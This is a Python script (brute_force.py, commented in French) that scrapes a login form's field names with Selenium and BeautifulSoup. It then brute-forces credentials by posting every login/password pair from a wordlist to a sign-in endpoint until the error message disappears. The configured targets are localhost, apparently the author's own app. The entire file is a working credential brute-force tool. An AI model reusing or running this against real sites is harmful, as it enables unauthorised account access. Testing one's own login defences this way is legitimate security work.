import requests
from selenium import webdriver
from selenium.webdriver.support.ui import WebDriverWait
from bs4 import BeautifulSoup
import time

'''brute_force.py permet de brut force le login et mot de passe du formulaire avec une liste de mots clés'''


def find_form(url):
    """Fonction permettant d'enregistrer le formulaire en executant dans un navigateur"""
    driver = webdriver.Chrome() #Ouvre navigateur Chrome (pour pourvoir executer les .js)
    driver.get(url) #Permet d'ouvrir la page de connexion
    wait = WebDriverWait(driver, 10) # Attendre que les éléments du formulaire soient présents
    html_out = driver.page_source # Extraire le contenu de la page html retour
    soup = BeautifulSoup(html_out, 'html.parser')# Analyser le contenu HTML
    form = soup.find('form') # Extraire les élement entre les balises form
    return str(form)

def find_user_pswd_button(url, input_name = 'data-rel', type_login = 'text', type_password = 'password', type_button = 'button'):
    """Trouve le nom des entrées du formulaire et l'id du boutton"""
    name_data = input_name #Nom du type de variable pour le login et password
    form = find_form(url)
    soup = BeautifulSoup(form, 'html.parser')
    form = soup.find('form')
    user = form.find('input', {'type': type_login}) #Cherche les entrées de type text
    user_name = user[name_data]
    pswd = form.find('input', {'type': type_password}) #Cherche les entrées de type password
    pswd_name = pswd[name_data]
    try:
        button = form.find('button', {'type' : type_button}) #Cherche le boutton d'envoie du formulaire
        button_id = button['id']
    except:
        button_id = ''
        print("Error to find button")
    return str(user_name), str(pswd_name), str(button_id)

'''======Données spécifique formulaire======'''
url = 'http://localhost:5173/' #URL du formulaire
url_back = 'http://localhost:8003/signin' #URL du back
error_message = "No user were found with this credentials, using password" #Message de réponse d'erreur du formulaire
pathWordlist = "./" #Chemin vers la liste de mot clé à utiliser
nameWordlist = "sample.txt"
response_text = "No user were found with this credentials, using password"

#Initialisation des payloads
user_name, pswd_name, button_id = find_user_pswd_button(url)

time1=time.time()
i=0
minute = 0
with open(pathWordlist + nameWordlist, 'r') as file:
    lines = file.readlines()

for line_login in lines:
    for line_password in lines:
        payload = {
            user_name: line_login.strip(),
            pswd_name: line_password.strip(),
        }
        response = requests.post(url_back, data=payload)
        response_text = response.text
        if error_message not in response_text: #Condition si le mdp et login sont trouvés
            time_diff = time.time()-time1
            seconds = int(time_diff % 60)
            minutes = int(time_diff//60)
            print(f"Login {line_login} / password {line_password} trouvé en {i} tentatives. Temps : {minutes} minutes et {seconds} secondes")
            break
        i+=1
        #if time.process_time()-time1 >= 60:
            #minute +=1
            #time1=time.time()
            #print(f"{i} tentatives en {minute} minutes")
            #time_diff = time.time()-time1
        if i%100 ==0:
            time_diff = time.time()-time1
            
            seconds = int(time_diff % 60)
            minutes = int(time_diff//60)
            print(f"{i} tentatives en {minutes} minutes et {seconds} secondes")
    else:
        continue 
    break 
